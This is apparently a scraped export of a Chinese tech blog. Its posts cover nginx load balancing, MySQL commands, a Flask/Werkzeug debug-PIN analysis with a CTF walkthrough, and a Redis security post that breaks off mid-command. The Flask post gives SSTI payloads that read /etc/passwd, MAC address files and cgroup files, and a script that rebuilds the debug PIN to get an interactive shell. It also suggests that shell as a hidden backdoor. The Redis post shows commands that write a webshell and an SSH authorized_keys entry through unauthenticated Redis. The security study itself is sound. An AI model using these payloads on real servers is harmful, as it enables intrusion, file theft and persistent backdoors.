location 块中的正则 uri 和请求字符串做匹配。 负载均衡12345678910111213141516171819202122232425262728293031323334http &#123;###此处省略一大堆没有改的配置 ##自定义我们的服务列表 upstream myserver&#123; server 127.0.0.1:8080; server 127.0.0.1:8090; &#125; server &#123; listen 8888 ; ##设置我们nginx监听端口为8888 server_name [服务器的ip地址]; # Load configuration files for the default server block. include /etc/nginx/default.d/*.conf; location / &#123; proxy_pass http://myserver; ##叮，核心配置在这里 proxy_connect_timeout 10; #超时时间，单位秒 &#125; error_page 404 /404.html; location = /40x.html &#123; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; &#125; &#125;&#125; nginx提供了三种不同的负载均衡策略供我们灵活选择，分别是： 轮询(默认方式): 每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器 down 掉，能自动剔除。用法：啥也不加，上文实例就是默认的方式，就是默认的 权重(weight): weight 代表权重,默认为 1,权重越高被分配的客户端越多,权重越大，能力越大，责任越大，处理的请求就越多。用法: 1234upstream myserver&#123; server 127.0.0.1:8080 weight =1; server 127.0.0.1:8090 weight =2; &#125; ip_hash：每个请求按访问 ip 的 hash 结果分配，这样每个访客固定访问一个后端服务器，可以解决 session 的问题。用法： 12345upstream myserver&#123; ip_hash;#可与weight配合使用 server 127.0.0.1:8080 weight =1; server 127.0.0.1:8090 weight =2; &#125; 动静分离动静分离就是把很少会发生修改的诸如图像，视频，css样式等静态资源文件放置在单独的服务器上，而动态请求则由另外一台服务器上进行，这样一来，负责动态请求的服务器则可以专注在动态请求的处理上，从而提高了我们程序的运行效率，与此同时，我们也可以针对我们的静态资源服务器做专属的优化，增加我们静态请求的响应速度 12345678910111213141516171819202122232425server &#123; listen 8886 ; server_name [你的服务器ip地址]; # Load configuration files for the default server block. include /etc/nginx/default.d/*.conf; location / &#123; root /html/; index index.html; &#125; #拦截静态资源，static里面存放的我们图片什么的静态资源 location ~ .*\\.(gif|jpg|jpeg|bmp|png|ico|js|css)$ &#123; root /data/; &#125; error_page 404 /404.html; location = /40x.html &#123; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; &#125; &#125;参考文章：写给后端的Nginx初级入门教程:实战篇写给后端的Nginx初级入门教程:基础篇","categories":[{"name":"中间件","slug":"中间件","permalink":"https://blog.cfyqy.com/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"https://blog.cfyqy.com/tags/nginx/"}],"author":"ye1s"},{"title":"mysql常用命令整理","slug":"mysql常用的操作命令","date":"2020-08-04T09:09:00.000Z","updated":"2021-01-04T02:34:14.443Z","comments":true,"path":"article/500cdf7f.html","link":"","permalink":"https://blog.cfyqy.com/article/500cdf7f.html","excerpt":"一些命令老是忘记，好记性不如烂笔头。","text":"一些命令老是忘记，好记性不如烂笔头。 mysql安装ubuntu 123apt-get install mysql-serverapt-get install mysql-clientapt-get install libmysqlclient-dev 默认密码 1sudo cat &#x2F;etc&#x2F;msyql&#x2F;debian.cnf 允许远程连接ubuntu1.改配置 1234sudo vi /etc/mysql/mysql.conf.d/mysqld.cnf#找到bind-address = 127.0.0.1这一行#改为bind-address = 0.0.0.0即可service mysql restart 2.设置用户远程连接 1234use mysql;//切换使用mysql数据库select user,host from user; //查看用户是否开启远程update user set host='%' where user='root'; //开启远程flush privileges;//刷新权限 mysql8 MySql 8.0.11 换了新的身份验证插件（caching_sha2_password）, 原来的身份验证插件为（mysql_native_password）。而客户端工具Navicat Premium12 中找不到新的身份验证插件（caching_sha2_password），对此，我们将mysql用户使用的 登录密码加密规则 还原成 mysql_native_password，即可登陆成功。 12select user,host,plugin,authentication_string from mysql.user;alter user 'username'@'%' identified with mysql_native_password by 'password'; 服务操作12service mysql startservice mysql stop 用户创建用户创建用户 1create user 'username' identified by 'password'; 修改密码 1alter user 'username'@'%' identified by 'password'; 删除用户 1alter user 'username'@'%' identified by 'password'; 权限授权 12grant select,insert,update,delete on dbname.* to 'username'@'%' with grant option;grant all privileges on tablename.* to 'username'@'localhost' with grant option; #授权某用户对某数据库的所有操作权 查权 1show grants for 'username'; 撤权 12revoke all privileges on *.* from 'username'@'%';revoke all privileges on dbname.* from 'username'@'%'; 数据库创建数据库判断原来不存在，则创建数据库，并指定编码格式和校验集： 1create database if not exists dbname default character set utf8 collate utf8_general_ci; 更改数据库的字符和校验集 1ALTER DATABASE dbname DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci 删除数据库 1drop database dbname; 表表结构创建表 1234567create table student(xh int(4),xm varchar(20),sex char(2),birthday date,sal double(7,2)); 修改字段 123alter table student add (classid int(2));alter table student modify (xm varchar(30));alter table student drop column sal; 修改表名 1rename student to stu; 表数据添加数据 1insert into student values(1,\"张三\",'男','01-5-05',10); 修改数据 1update student set sex=\"女\" where xh=1 删除数据 12delete from student ;delete from student where condition; 表查询123456desc student;insert into newtablename select * from student; #表复制select count(*) from student;select distinct xm from student;select xm \"姓名\", sex \"性别\" from student; 使用别名like操作符 # %表示多个字符，`_`表示单个字符 备份导入1234create database databasename;#注意数据库的编码use databasename;set names utf8;# 设置数据库编码source absolutepath #数据库文件的位置 导出表结构和数据 12mysqldump -u username -p databasename &gt; databasename.sqlinput: password 表结构 12mysqldump -u username -p -d databasename &gt; databasename.sqlinput: password 字符集和校验集字符集常用的字符集： gbk：一个汉字占用2个字节 utf8：一个汉字占用3个字节 utf8mb4：一个汉字占用4个字节 查看支持的字符集 1show character set; 查看字符编码设置 1show variables like 'character%'; 设置编码字符集 1set names 'utf8'; 修改数据库字符集 1alter database dbname character set xxx; 只修改表的字符集，影响后续该表新增列的默认定义，已有列的字符集不受影响。 1alter table tablename character set xxx； 同时修改表字符集和已有列字符集，并将已有数据进行字符集编码转换。 1alter table tablename convert to character set xxx; 校验集COLLATE 是指在同一字符集内字符之间的比较规则；确定比较规则后，才能在一个字符集上定义什么是等价的字符，以及字符之间的大小关系 命名惯例：以对应的字符集名称开头；以_ci(表示大小写不敏感)、_cs(表示大小写敏感)或_bin(表示按编码值比较)结尾。例如：在字符序“utf8_general_ci”下，字符“a”和“A”是等价的；查看支持的校验集 1show collation; 查看当前字符集和校对规则设置 1show variables like 'collation_%'; utf8_general_ci校对速度快，但准确度稍差utf8_unicode_ci准确度高，但校对速度稍慢 DBA建议使用传统的utf8_general_ci 设置各种字符集mysql的字符集和校对规则有四个级别的默认设置：服务器级、数据库级、数据表级、字段级。它们分别在不同的地方设置，作用也不相同。 服务器级① 设置服务器级字符集与校队规则 可以在my.cnf中设置,会在mysql服务启动的时候确定 12[mysqld]character-set-server=utf8 或者在启动选项中指定 或者在编译时指定(源码安装mysql) ② 查看服务器级的字符集和校队规则 12show variables like 'character_set_server';show variables like 'collation_set_server'; 数据库级数据库的字符集和校对规则可以在创建表的时候指定，也可以创建数据库后通过alter database命令进行修改，如果数据库中已经存在数据，则修改字符集不会对原有记录造成影响，原有的记录依然按照以前的字符集存放① 在创建数据库时指定字符集和校队规则 ② 修改已存在的数据库的字符集和校队规则 ③ 查看数据库字符集和校队规则 12show variables like 'character_set_database';show variables like 'collation_database'; 数据表级表的字符集和校对规则可以在创建表的时候指定，也可以后期通过alter table命令进行修改，如果表中原来已有记录，则修改字符集不会对原有记录造成影响，原有的记录依然按照以前的字符集存放 ① 创建数据表时指定字符集 123create table test_tablename (id int not null,)default charset=utf8; ② 修改数据表的字符集 ③ 查看数据表的字符集 列字符集和校队规则mysql可以定义列级别的字符集和校对规则，主要是针对相同的表不同字段需要使用不同的字符集的情况，应该说遇到这种情况的概率比较低，这只是mysql提供给我们一个灵活设置的手段列字符集可以在创建表时指定，也可以在后期通过修改表来调整，如果在创建表的时候没有指定字符集和校队规则，则默认使用表的字符集和校对规则 连接字符集和校对规则上面四种设置方式仅仅是针对于数据在数据库中保存时使用的字符集和校对规则，而对于实际的应用程序来说，还存在客户端和服务器之间交互的字符集和校对规则的设置对于客户端和服务器的交互操作，mysql提供了三个不同的参数：character_set_client 、 character_set_connection、character_set_results,分别代表客户端、连接和返回结果的字符集，通常情况下，这三个设置应该是相同的，才可以确保用户写入的数据被正确读出可以通过一个命令同时设置这三个参数 这个命令可以同时修改这三个参数的值，或者在配置文件my.cnf中设置 12[mysql]default-character-set&#x3D;utf8 一个提交的分解 客户端发起 查询 服务器使用character_set_client变量作为客户端发送的查询中使用的字符集。 服务器拿到 查询 后用将character_set_client 编码方式转为 character_set_connection对应的校验规则为collation_connection， (如果查询是文字字符串，也就是他们有某种字符格式的引介词 例如_utf8,如果是列值，校验规则将不依靠collation_connection) 服务器执行查询的结果 将会 按照 character_set_results 编码方式返回查询结果到客户端。包括结果数据，例如列值和结果元数据（如列名） 字符和校验集设置修改my.cnf 12345678910111213[client]default-character-set=utf8[mysql]default-character-set=utf8[mysqld]init_connect='SET collation_connection = utf8_general_ci'init_connect='SET NAMES utf8'character-set-server=utf8collation-server=utf8_general_ciskip-character-set-client-handshake 数据数据存储位置1sudo service MySQL stop#迁移前必须先停止mysql 创建mysql 存放的 目标文件夹 一般 默认的 mysql 存储目录在 /var/lib中文件的权限 为 700 且 用户和用户组 都为 mysql,接下来的创建 文件夹必须和这个一样: 我这里挂载盘/mnt/data 可以迁移到这里，并建一个文件夹: 1sudo mkdir mysql 修改所属用户 和所属用户组为 msyql 1sudo chown -vR mysql:mysql /mnt/data/mysql/ 修改权限 1sudo chmod -vR 700 /mnt/data/mysql/ 迁移文件 进入 /var/lib 建议使用cp命令 防止万一出现问题 使用su命令 切换到 root 因为 权限 为 700 为了保证 目录权限和属性 和以前的一致 ,加 av 后缀 1cp -av /var/lib/mysql/* /mnt/data/mysql/ exit;退出root 修改mysql的配置文件: 1sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf 修改 datadir 为 /mnt/data/mysql/ 以上mysql的配置修改完毕配置AppArmor访问控制 1vim /etc/apparmor.d/tunables/alias # 配置别名规则 文件最后添加一行 1alias /var/lib/mysql/ -&gt; /mnt/mysql/, 重启AppArmor服务 1service apparmor restart 启动mysql 1/etc/init.d/mysql start 查看mysql新目录的值 12mysql -uroot -pselect @@datadir; 表数据大小Navicat导入SQL文件时报错：MySql 错误 Err [Imp] 1153 - Got a packet bigger than &#39;max_allowed_packet&#39; bytes 查了一下，原来是MySQL默认读取执行的SQL文件最大为16M，我这个SQL文件260M，所以执行不过去 解决方法： 在MySQL安装目录下找到文件my.cnf，搜索[mysqld]，在其下面添加一句话 1max_allowed_packet=400M mysql8参考文章：MYSQL字符集与校对规则","categories":[{"name":"数据库","slug":"数据库","permalink":"https://blog.cfyqy.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://blog.cfyqy.com/tags/mysql/"}],"author":"ye1s"},{"title":"Flask debug模式下的PIN码安全性","slug":"Flask-debug模式下的PIN码安全性","date":"2020-07-29T09:52:59.000Z","updated":"2020-12-14T07:41:34.728Z","comments":true,"path":"article/643a3db.html","link":"","permalink":"https://blog.cfyqy.com/article/643a3db.html","excerpt":"首发于先知社区https://xz.aliyun.com/t/8092","text":"首发于先知社区https://xz.aliyun.com/t/8092 一、概述Flask 如果在生产环境中开启 debug模式，就会产生一个交互的shell,可以执行自定义的 python 代码。在较旧版本中是不用输入 PIN 码就可以执行代码，在新版本中需要输入一个 PIN 码。 在同一台机器上，多次重启Flask服务，PIN码值不改变，也就是说 PIN 码不是随机生成的，有一定的生成方法可循。接下来，我们来具体地分析一下 PIN 码的生成流程 本文章的分析都是基于python2.7的。 二、PIN码生成流程分析本次调试环境： python2.7 window10 flask1.1.2 这里就使用pycharm进行调试。示例代码如下，在app.run设置断点按F7进入Flask类的run方法 ,位置python2.7\\Lib\\site-packages\\flask\\app.py(889~995)，这里都是一些变量的加载，不用理会，多次按F8直到run_simple()函数调用。按F7进入run_simple(),位置python2.7\\Lib\\site-packages\\werkzeug\\serving.py(876~971)，这里判断了是否使用debug调试，有的话就调用DebuggedApplication类按F7进入，位置python2.7\\Lib\\site-packages\\werkzeug\\debug\\__init__.py(220~498),从DebuggedApplication的__init__初始化操作中，有一个判断，如果启用PIN，及self.pin存在值，就会通过_log()函数，将PIN码打印到出来。ctrl+鼠标左击进入self.pin，这里使用了@property装饰器，@property就是负责把一个方法变成属性调用的，方便定义属性的get和set方法。可以看到调用了get_pin_and_name()对PIN进行赋值。 ctrl+鼠标左击进入get_pin_and_name()，位置python2.7\\Lib\\site-packages\\werkzeug\\debug\\__init__.py(137~217),这里就是生成PIN码的重点代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081def get_pin_and_cookie_name(app): \"\"\"Given an application object this returns a semi-stable 9 digit pin code and a random key. The hope is that this is stable between restarts to not make debugging particularly frustrating. If the pin was forcefully disabled this returns `None`. Second item in the resulting tuple is the cookie name for remembering. \"\"\" pin = os.environ.get(\"WERKZEUG_DEBUG_PIN\") rv = None num = None # Pin was explicitly disabled if pin == \"off\": return None, None # Pin was provided explicitly if pin is not None and pin.replace(\"-\", \"\").isdigit(): # If there are separators in the pin, return it directly if \"-\" in pin: rv = pin else: num = pin modname = getattr(app, \"__module__\", app.__class__.__module__) try: # getuser imports the pwd module, which does not exist in Google # App Engine. It may also raise a KeyError if the UID does not # have a username, such as in Docker. username = getpass.getuser() except (ImportError, KeyError): username = None mod = sys.modules.get(modname) # This information only exists to make the cookie unique on the # computer, not as a security feature. probably_public_bits = [ username, modname, getattr(app, \"__name__\", app.__class__.__name__), getattr(mod, \"__file__\", None), ] # This information is here to make it harder for an attacker to # guess the cookie name. They are unlikely to be contained anywhere # within the unauthenticated debug page. private_bits = [str(uuid.getnode()), get_machine_id()] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, text_type): bit = bit.encode(\"utf-8\") h.update(bit) h.update(b\"cookiesalt\") cookie_name = \"__wzd\" + h.hexdigest()[:20] # If we need to generate a pin we salt it a bit more so that we don't # end up with the same value and generate out 9 digits if num is None: h.update(b\"pinsalt\") num = (\"%09d\" % int(h.hexdigest(), 16))[:9] # Format the pincode in groups of digits for easier remembering if # we don't have a result yet. if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = \"-\".join( num[x : x + group_size].rjust(group_size, \"0\") for x in range(0, len(num), group_size) ) break else: rv = num return rv, cookie_name 首先初始化了三个变量，都为None,其中rv就是PIN的值，在分析过程中需要重点关注其值的变化。因为PIN为None，所以第150~159的两个if不会执行，直接跳过。接下来，也是一些有关PIN生成变量的赋值。 变量值赋值后的结果如下然后再对probably_public_bits和private_bits列表的元素进行 md5.update,update 会将每次字符串拼接,相当于对probably_public_bits、private_bits的所有元素加上cookiesalt和pinsalt字符串进行拼接一个长字符串，对这个长字符串进行md5加密，生成一个MD5加密的值，取前9位，赋值给num。最后将num的九位数的值分割成3个三位数，再用-连接3个三位数拼接，赋值给rv，这个rv就是PIN的值。最后PIN的值如下 三、PIN码获取从如上的PIN的生成流程分析，可以知道PIN主要由probably_public_bits和private_bits两个列表变量决定，而这两个列表变量又由如下6个变量决定： username 启动这个Flask的用户 modname 一般默认flask.app getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) 一般默认flask.app为Flask getattr(mod, &#39;__file__&#39;, None)为flask目录下的一个app.py的绝对路径,可在爆错页面看到 str(uuid.getnode()) 则是网卡mac地址的十进制表达式 get_machine_id() 系统id 那又如何获取这6个变量呢？因为modname 一般默认flask.app，getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) 一般默认flask.app为Flask，所以主要获取剩下的4个变量即可。 1.liunx下PIN码获取还是用上面流程分析的代码，在linux中运行。(1). uaername 可以从/etc/passwd中读取。这里是root用户启动的，所以值为root，不知道哪个用户启动的，可以按照/etc/passwd里的用户多尝试一下。(2). getattr(mod, &#39;__file__&#39;, None) flask目录下的一个app.py的绝对路径,这个值可以在报错页面看到。但有个需注意，python3是app.py，python2中是app.pyc。这里值为/usr/local/lib/python2.7/dist-packages/flask/app.pyc(3). str(uuid.getnode()) MAC地址 读取这两个地址：/sys/class/net/eth0/address 或者 /sys/class/net/ens33/address.转化为10进制，这里值为52228526895(4). get_machine_id() 系统id 。我们进入get_machine_id()，从代码中可以得知这里对linux、os、window的3种系统的获取方法。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677def get_machine_id(): global _machine_id if _machine_id is not None: return _machine_id def _generate(): linux = b\"\" # machine-id is stable across boots, boot_id is not. for filename in \"/etc/machine-id\", \"/proc/sys/kernel/random/boot_id\": try: with open(filename, \"rb\") as f: value = f.readline().strip() except IOError: continue if value: linux += value break # Containers share the same machine id, add some cgroup # information. This is used outside containers too but should be # relatively stable across boots. try: with open(\"/proc/self/cgroup\", \"rb\") as f: linux += f.readline().strip().rpartition(b\"/\")[2] except IOError: pass if linux: return linux # On OS X, use ioreg to get the computer's serial number. try: # subprocess may not be available, e.g. Google App Engine # https://github.com/pallets/werkzeug/issues/925 from subprocess import Popen, PIPE dump = Popen( [\"ioreg\", \"-c\", \"IOPlatformExpertDevice\", \"-d\", \"2\"], stdout=PIPE ).communicate()[0] match = re.search(b'\"serial-number\" = &lt;([^&gt;]+)', dump) if match is not None: return match.group(1) except (OSError, ImportError): pass # On Windows, use winreg to get the machine guid. try: import winreg as wr except ImportError: try: import _winreg as wr except ImportError: wr = None if wr is not None: try: with wr.OpenKey( wr.HKEY_LOCAL_MACHINE, \"SOFTWARE\\\\Microsoft\\\\Cryptography\", 0, wr.KEY_READ | wr.KEY_WOW64_64KEY, ) as rk: guid, guid_type = wr.QueryValueEx(rk, \"MachineGuid\") if guid_type == wr.REG_SZ: return guid.encode(\"utf-8\") return guid except WindowsError: pass _machine_id = _generate() return _machine_id 只要从/etc/machine-id、/proc/sys/kernel/random/boot_id中读到一个值后立即break，然后和/proc/self/cgroup中的id值拼接 2020.1.5对machine_id()进行了更新 ，所以2020.1.5之前的版本是跟这里不同的，具体更新情况可看https://github.com/pallets/werkzeug/commit/617309a7c317ae1ade428de48f5bc4a906c2950f 2020.1.5修改前是：是依序读取/proc/self/cgroup、/etc/machine-id、/proc/sys/kernel/random/boot_id三个文件，只要读取到一个文件的内容，立马返回值。这里/etc/machine-id 为75d03aa852be476cbe73544c93e98276 ，/proc/self/cgroup只读取第一行，并以从右边算起的第一个‘/’为分隔符，分成两部分，去右边那部分，这里为空，所以这里get_machine_id()的值为75d03aa852be476cbe73544c93e98276。 现在已经知道所有变量的值，可以就用get_pin_and_cookie_name的部分代码生成PIN码。 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ 'root'# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python2.7/dist-packages/flask/app.pyc' # getattr(mod, '__file__', None),]private_bits = [ '52228526895',# str(uuid.getnode()), /sys/class/net/ens33/address '75d03aa852be476cbe73544c93e98276'# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 最后生成的PIN码为638-233-100，输入后即可看到一个shell的交互界面 2.window下PIN码获取(1). uaername 可以从net user 命令查看，这里值为Administrator(2). getattr(mod, &#39;__file__&#39;, None) flask目录下的一个app.py的绝对路径,这个值可以在报错页面看到。但有个需注意，python3是app.py，python2中是app.pyc。这里值为G:\\code\\venv\\flaskProject2\\lib\\site-packages\\flask\\app.pyc(3). str(uuid.getnode()) MAC地址 ipconfig /all转化为10进制，这里值为137106045523937(4). get_machine_id() 系统id 。打开注册表查看\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography的MachineGuid 值也可以用reg 命令行查询 1reg query HKLM\\SOFTWARE\\Microsoft\\Cryptography 这里值为e7090baa-1fff-45a8-9642-005948e998da最后用上面的脚本生成PIN，结果尝试了一下是错了。 重新调试了一下脚本，发现str(uuid.getnode())的MAC地址不对，我本机上有多个网卡，所以有多个MAC地址，我一开始以为是uuid.getnode()获取的是当前正在的网卡的MAC地址。看了一下uuid.getnode()的底层实现源码，才知道，它是执行了ipconfig /all,根据返回的结果，逐行地去正则匹配MAC地址，第一个匹配成功就返回。所以我这里第一个返回的MAC地址为7C-B2-7D-23-D7-E5，转化为十进制后为137106045523941，最后生成的PIN码为296-090-416 四、例题1. werkzeug 1.0.1 之前的版本以华东赛区的[CISCN2019 华东南赛区]Double Secret为例题做题地址在BUUCTF https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA]Double%20Secret 在/secret?secret=123123 位置中，当secret的参数值超过5位数的时候，就会报一个交互的shell。这里还存在SSTI，我们可以利用读取生成PIN码所需的变量值。 后端对secret传入的值进行RC4加密，RC4加密方式为：明文加密一次得到密文，再加密一次得到明文。 所以使用RC4脚本对要字符串进行加密，传入给secret中 rc4加密脚本 12345678910111213141516171819202122232425262728293031323334353637import base64from urllib.parse import quotedef rc4_main(key = \"init_key\", message = \"init_message\"): # print(\"RC4加密主函数\") s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return cryptdef rc4_init_sbox(key): s_box = list(range(256)) # 我这里没管秘钥小于256的情况，小于256不断重复填充即可 # print(\"原来的 s 盒：%s\" % s_box) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] # print(\"混乱后的 s 盒：%s\"% s_box) return s_boxdef rc4_excrypt(plain, box): # print(\"调用加密程序成功。\") res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) # print(\"res用于加密字符串，加密后是：%res\" %res) cipher = \"\".join(res) print(\"加密后的字符串是: %s\" %quote(cipher)) #print(\"加密后的输出(经过编码):\") #print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8')) return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))#rc4_main(\"HereIsTreasure\",\"&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag.txt').read()&#125;&#125;\")#rc4_main(\"HereIsTreasure\",\"&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()&#125;&#125;\")#rc4_main(\"HereIsTreasure\",\"&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/sys/class/net/eth0/address').read()&#125;&#125;\")rc4_main(\"HereIsTreasure\",\"&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/proc/self/cgroup').read()&#125;&#125;\") （1）username对如下字符串进行rc4加密，再传入secret中 1&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd’).read()&#125;&#125; 加密后 1.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98&#x2F;%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1C%C2%AEJuT6%C3%BA%5C%C3%8C%3D%C2%A75%C3%9Dz%5C%3F2%0D%C3%86%C3%8BF 可以得到username为glzjin （2）getattr(mod, &#39;__file__&#39;, None) 从报错页面得知为/usr/local/lib/python2.7/site-packages/flask/app.pyc（3）str(uuid.getnode())对如下字符串进行rc4加密，再传入secret中 1&#123;&#123;&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address’).read()&#125;&#125; 对得到的mac地址，转化为十进制2485410510816（4）get_machine_id()对如下字符串进行rc4加密，再传入secret中 1&#123;&#123;&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;proc&#x2F;self&#x2F;cgroup’).read()&#125; 值为docker后面的字符串e86b36a1c2f2448c11ab6bad15fa05d61697462180527bb51d9e7aeb84c4d731最后得到的6个变量的值分别为 username 值为glzjin modname 值为flask.app getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) 值为Flask getattr(mod, &#39;__file__&#39;, None)值为/usr/local/lib/python2.7/site-packages/flask/app.pyc str(uuid.getnode()) 值为2485410510816 get_machine_id() 值为e86b36a1c2f2448c11ab6bad15fa05d61697462180527bb51d9e7aeb84c4d731 用如下脚本生成PIN 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ 'glzjin'# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python2.7/site-packages/flask/app.pyc' # getattr(mod, '__file__', None),]private_bits = [ '2485410510816',# str(uuid.getnode()), /sys/class/net/ens33/address 'e86b36a1c2f2448c11ab6bad15fa05d61697462180527bb51d9e7aeb84c4d731'# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 输入正确的PIN码，得到一个交互的shell werkzeug 1.0.1 版本五、总结Flask debug 交互性 shell 需要对主机有一定的访问权限，从渗透的角度来看，比较适合做个隐藏的后门。","categories":[],"tags":[],"author":"ye1s"},{"title":"redis安全小结","slug":"redis安全整理","date":"2020-07-27T07:52:00.000Z","updated":"2020-08-09T14:19:55.651Z","comments":true,"path":"article/3347494d.html","link":"","permalink":"https://blog.cfyqy.com/article/3347494d.html","excerpt":"redis是完全开源免费的，遵守BSD协议，是一个高性能的key-value数据库。Redis服务的默认端口是6379,默认是不设置密码，可以未授权访问，导致出现一些安全隐患。","text":"redis是完全开源免费的，遵守BSD协议，是一个高性能的key-value数据库。Redis服务的默认端口是6379,默认是不设置密码，可以未授权访问，导致出现一些安全隐患。 环境搭建redis-serverubuntu:docker 123git clone https://github.com/vulhub/vulhub.gitcd ./vulhub/redis/4-unaccdocker-compose up -d 直接命令安装 123456sudo apt-get updatesudo apt-get install redis-server#启动 Redisredis-server#启动clientredis-cli 较新版的默认是中允许本地访问，需要修改修改配置文件 redis-clientwindow:下载地址：https://github.com/tporadowski/redis/releases 1redis-cli.exe -h redis-server地址 -p 6379 linux的利用信息泄露info命令可以看到Redis的版本、OS内核版本等信息keys *来获取所有的(谨用,输出量过大的话很容易把环境崩掉)flushall等相关命令可以将Redis数据库所有内容删除掉 写webshell必要条件： 知道网站绝对路径 拥有网站目录写入权限 这种情况一般大都是出在了root权限执行的redis中,或者是以某个web服务来启动的redis，从而对web目录具有了可写的权限。 看redis数据库配置信息。因为我们写Webshell会修改dir和dbfilename，所以这里查看配置信息主要记下原来的值，好在写入后修改回来。 1234567891011121314192.168.10.6:6379&gt; config set dir /var/www/htmlOK192.168.10.6:6379&gt; config set dbfilename shell.phpOK192.168.10.6:6379&gt; set payload \"\\n&lt;?php phpinfo();&gt;\\n\"OK192.168.10.6:6379&gt; saveOK192.168.10.6:6379&gt; del payload(integer) 1192.168.10.6:6379&gt; config set dir /var/lib/redisOK192.168.10.6:6379&gt; config set dbfilename dump.rdbOK 写入公钥必要条件: 知道启动服务的用户 拥有.ssh目录 允许使用基于密钥认证的方式登陆 生成公钥 12ssh-keygen -t rsa 生成公钥和私钥 cd ~/.ssh 可看到公钥秘钥 写入到文件中，文件不会只有我们写入的内容，所以这里需要将公钥ye1s.pub的内容进行一个补充，在头尾加入换行符。 1\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDqf40qpRVPYOeVLOzXRniIcRSoFr4LmF3Uhx9vsjECQjF0ZTQsb61zlSE5PMQXmf1IPeUVUKUwNkf5hsN9HgR/vTrfapCPvO9hClsZ3zD5YxO0aPoRqRWqhzRgLDgPfNRo0FUVUh0cKYl5JxwbrWFzFo+nFjRhF1xZfPLO4HgDakZBSdOzeNeSHjxL/tZsO5cywdoSBxrC4gc2089JDBdUQ8sPF1AL2G4lePOxc8aK7fCS0XPeizhJpfxdB+O2Bm1hrphP7+BGRPuZKLTT/5KS41TsXVVapT0azHBF1CLyjjDGKtZQZHHxWYnG+5/GFfnASKLOq37Dj6h6ADRZ+OP/ administrator@XTTD-2020QZVJYE\\n\\n 设置写入文件路径，文件名称，完成公钥的写入。若为root启动redis服务，那么文件路径设置为/root/.ssh。若为redis或者其他用户启动，那设置为/home/ye1s/.ssh。 12345678910192.168.10.6:6379&gt;config set dir /home/ye1s/.sshOK192.168.10.6:6379&gt; config set dbfilename authorized_keysOK192.168.10.6:6379&gt; set rsapub \"\\n\\nssh-rsa 